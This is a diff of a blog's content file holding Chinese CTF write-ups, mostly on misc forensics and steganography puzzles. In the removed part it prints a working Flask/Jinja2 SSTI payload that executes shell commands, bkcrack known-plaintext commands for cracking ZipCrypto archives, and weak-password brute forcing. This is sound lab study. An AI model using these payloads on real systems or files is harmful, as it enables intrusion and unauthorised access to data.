+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
+<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
+<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
+<p>查完没有藏文件，那应该就是隐写了</p>
+<p>结果没有发现隐写，感觉被骗了</p>
+<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
+<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
+<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
+<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
+<p>成功了，打开提取的文件发现有PK头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
+<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
+<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
+<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
+<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
+<p>foremost出一下，要密码，先尝试弱密码爆破</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
+<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
+<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
+<p>看来是改了后缀，010先查查看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
+<p>演都不演了…</p>
+<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
+<p>盯完帧没有东西，看看副本，发现已经损坏</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
+<p>（这里-其实是_）</p>
+<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
+<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
+<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
+<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
+<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
+<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
+</blockquote>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
+<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
+<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
+crc32 flag.jpg</code></pre>
 
-<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
-<pre><code class="highlight python"><span class="keyword">import</span> zipfile
-<span class="keyword">import</span> os
-<span class="keyword">import</span> base64
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
+<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
+<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
+<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
+<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
+<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
 
-<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
-    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
-        encoded_password = f.read().strip()
-    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
-    <span class="keyword">return</span> decoded_password
-<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
-    <span class="keyword">try</span>:
-        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
-            zf.extractall(path=extract_to, pwd=password.encode())
-            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
-            <span class="keyword">return</span> zf.namelist()  
-    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
-        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
-        <span class="keyword">return</span> []
-<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
-    current_number = start_number
-    <span class="keyword">while</span> <span class="literal">True</span>:
-        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
-        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
-        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
-            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
-            <span class="keyword">break</span>
-        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
-            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
-            <span class="keyword">break</span>
-        password = decode_password(password_filename)
-        extracted_files = extract_zip(zip_filename, password,parent_dir)
-        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
-            <span class="keyword">break</span>
-        next_zip_file = <span class="literal">None</span>
-        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
-            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
-                next_zip_file = extracted_file
-                <span class="keyword">break</span>
-        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
-            <span class="keyword">break</span>
-        current_number -= <span class="number">1</span>
-<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
-    recursive_extract()</code></pre>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
+<p>水平有限，还是手敲罢</p>
+<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
 
-<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
-<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
-<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
-<pre><code class="highlight python"><span class="keyword">import</span> os
-<span class="keyword">import</span> base64
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
+<p>鉴定为图片纯纯的诈骗（恼</p>
+<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
+<p>要画图，那么应该藏了坐标，010查一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
+<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
+<blockquote>
+<p>随波逐流</p>
+</blockquote>
+<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
+<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
+<blockquote>
+<p>脚本画图</p>
+</blockquote>
+<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
+<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
+<p>​	<code>*gnuplot*</code>绘图</p>
+<p>贴个脚本先</p>
+<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
+    re = res.read()
+    res.close()
+    
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        for j in range(0, len(tem)):
+            if tem[j] == &#x27;,&#x27;:
+                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()</code></pre>
 
+<p>得到去括号，去逗号的坐标值</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
+<p>贴一下ubuntu下的下载和使用方法</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
+gnuplot
+plot <span class="string">&quot;output.txt&quot;</span></code></pre>
 
-<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
-    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
-        encoded_password = f.read().strip()
-    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
-    <span class="keyword">return</span> decoded_password
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
+<p>可以扫出来</p>
+<p>​	<em>matplotlib</em>绘图</p>
+<p>把原文本去括号，用脚本跑</p>
+<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
+import numpy as np
+with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
+    re = res.read()
+    res.close()
 
-<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
-    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
-        current_number = start_number
-        <span class="keyword">while</span> <span class="literal">True</span>:
-            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
-            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
-                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
-                <span class="keyword">break</span>
-            decoded_password = decode_password(password_filename)
-            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
-            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
-            current_number += <span class="number">1</span>
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()
+x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
+plt.plot(x, y, &#x27;.&#x27;)
+plt.show()</code></pre>
 
-
-<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
-    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>
-
-<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
-<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
-<p>拿到一张png，用010查一下看到zip头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
-<p>foremost提取一下</p>
-<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
-<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
-<p>脚本：</p>
-<pre><code class="highlight plaintext">import os
-import zipfile
-import tarfile
-import py7zr
-import shutil
-
-
-def extract_zip(zip_path, extract_dir):
-    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
-    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
-        zip_ref.extractall(extract_dir)
-        return zip_ref.namelist()  # 返回解压出来的文件列表
-
-
-def extract_tar(tar_path, extract_dir):
-    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
-    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
-        tar_ref.extractall(extract_dir)
-        return tar_ref.getnames()  # 返回解压出来的文件列表
-
-
-def extract_7z(archive_path, extract_dir):
-    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
-    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
-        archive_ref.extractall(extract_dir)
-        return archive_ref.getnames()  # 返回解压出来的文件列表
-
-
-def handle_compressed_file(file_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
-    if file_path.endswith(&#x27;.zip&#x27;):
-        extracted_files = extract_zip(file_path, extract_dir)
-    elif file_path.endswith(&#x27;.tar&#x27;):
-        extracted_files = extract_tar(file_path, extract_dir)
-    elif file_path.endswith(&#x27;.7z&#x27;):
-        extracted_files = extract_7z(file_path, extract_dir)
-    else:
-        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
-        return []
-
-    # 记录去掉后缀并连接的文件名
-    with open(output_txt, &#x27;a&#x27;) as output_file:
-        for file_name in extracted_files:
-            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
-            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)
-
-    return extracted_files
-
-
-def process_zip(zip_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
-    # 解压当前zip文件并返回解压后的文件列表
-    extracted_files = extract_zip(zip_path, extract_dir)
-
-    for extracted_file in extracted_files:
-        extracted_file_path = os.path.join(extract_dir, extracted_file)
-
-        if os.path.isdir(extracted_file_path):
-            continue  # 跳过目录
-
-        # 如果解压出来的是压缩包，再进行递归处理
-        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
-            # 解压嵌套压缩包并处理
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-            # 如果是嵌套的压缩包，再递归调用
-            if extracted_file.endswith(&#x27;.zip&#x27;):
-                process_zip(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.tar&#x27;):
-                process_tar(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.7z&#x27;):
-                process_7z(extracted_file_path, extract_dir, output_txt)
-
-        else:
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-
-    # 删除当前处理的压缩包
-    if zip_path.endswith(&#x27;.zip&#x27;):
-        os.remove(zip_path)
-
-
-def process_tar(tar_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
-    extracted_files = extract_tar(tar_path, extract_dir)
-    for extracted_file in extracted_files:
-        extracted_file_path = os.path.join(extract_dir, extracted_file)
-
-        if os.path.isdir(extracted_file_path):
-            continue
-
-        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-            if extracted_file.endswith(&#x27;.zip&#x27;):
-                process_zip(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.tar&#x27;):
-                process_tar(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.7z&#x27;):
-                process_7z(extracted_file_path, extract_dir, output_txt)
-
-    # 删除当前处理的压缩包
-    if tar_path.endswith(&#x27;.tar&#x27;):
-        os.remove(tar_path)
-
-
-def process_7z(archive_path, extract_dir, output_txt):
-    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
-    extracted_files = extract_7z(archive_path, extract_dir)
-    for extracted_file in extracted_files:
-        extracted_file_path = os.path.join(extract_dir, extracted_file)
-
-        if os.path.isdir(extracted_file_path):
-            continue
-
-        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
-            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
-            if extracted_file.endswith(&#x27;.zip&#x27;):
-                process_zip(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.tar&#x27;):
-                process_tar(extracted_file_path, extract_dir, output_txt)
-            elif extracted_file.endswith(&#x27;.7z&#x27;):
-                process_7z(extracted_file_path, extract_dir, output_txt)
-
-    # 删除当前处理的压缩包
-    if archive_path.endswith(&#x27;.7z&#x27;):
-        os.remove(archive_path)
-
-
-def main():
-    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
-    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
-    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
-
-    if not os.path.exists(extract_dir):
-        os.makedirs(extract_dir)
-
-    # 开始处理压缩包
-    with open(output_txt, &#x27;w&#x27;) as output_file:
-        output_file.write(&quot;&quot;)
-    process_zip(zip_path, extract_dir, output_txt)
-
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre>
-
-<p>再对提出来的文件名做两种处理</p>
-<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
-    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
-    with open(input_txt, &#x27;r&#x27;) as infile:
-        file_names = infile.readlines()
-
-    # 去掉换行符并从后往前连接
-    reversed_file_names = [name.strip() for name in reversed(file_names)]
-
-    # 将连接后的文件名写入新文件
-    with open(output_txt, &#x27;w&#x27;) as outfile:
-        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
-        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
-def remove_newlines_and_connect(input_txt, output_txt):
-    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
-    with open(input_txt, &#x27;r&#x27;) as infile:
-        # 读取所有行并去掉换行符
-        file_names = infile.read().splitlines()
-
-    # 将文件名用空格连接
-    connected_file_names = &quot;&quot;.join(file_names)
-
-    # 将连接后的文件名写入新文件
-    with open(output_txt, &#x27;w&#x27;) as outfile:
-        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
-        outfile.write(connected_file_names)  # 直接写入连接后的字符串
-
-def main():
-    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
-    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
-    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
-    reverse_file_names(input_txt, output1_txt)
-    remove_newlines_and_connect(input_txt, output2_txt)
-
-if __name__ == &quot;__main__&quot;:
-    main()</code></pre>
-
-<p>根据提示BASE58-Ripple、SM4-ECB</p>
-<p>先后尝试顺序的和逆序的</p>
-<p>最后逆序的得到以下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
-<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
-<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
-<p>在谷歌搜图后判断出是 DataMatrix码</p>
-<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
-<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
-<p>根据提示deepsound和弱口令</p>
-<p>试一下123？</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
-<p>运气比较好直接出来了</p>
-<p>提取zip后发现需要密码打开</p>
-<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
-<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
-<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
-bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
-
-<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
-<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>
-
-<p>得到flag.png</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
-<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
-<p>先试着打一下，看看有没有绕过</p>
-<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
-<p>直接爆了，那就ls换cat flag解决</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
       <tags>
-        <tag>-CTF -misc -WP</tag>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1676,168 +1838,6 @@ bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
 </script></td></tr></tbody></table>]]></content>
       <tags>
         <tag>-HTML -Web前端</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU—MISC刷题记录</title>
-    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
-<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
-<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
-<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
-<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
-<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
-<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
-<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
-<p>主要是HTTP流量，直接追踪流</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
-<p>用<code>captfencoder</code>MD5一下结束战斗</p>
